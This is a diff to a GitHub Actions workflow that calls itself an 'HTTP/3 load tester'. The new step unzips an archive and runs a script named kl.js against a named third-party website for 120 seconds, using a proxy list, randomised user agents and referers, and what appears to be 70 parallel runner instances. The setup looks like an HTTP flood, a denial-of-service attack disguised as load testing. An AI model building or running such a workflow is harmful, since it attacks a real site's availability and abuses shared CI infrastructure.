@@ -33,15 +33,13 @@ jobs:
       
       
       - name: Install Node.js dependencies
-        run: npm install axios hpack 
+        run: npm install    axios chalk@4 colors request user-agents random-referer hpack
             
       - name: Run HTTP/3 load tester
         run: |
-          
-          git clone  https://github.com/Ggeg111/curly-octo-doodle.git
-          cd curly-octo-doodle
-          
-          node m.js
+          unzip Fc-main.zip
+          cd Fc-main
+          node kl.js GET https://tw-masterclass.com/page_ufchq/ 300 4 120 proxy.txt
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
           TOTAL_INSTANCES: 70  # Updated to match the matrix count
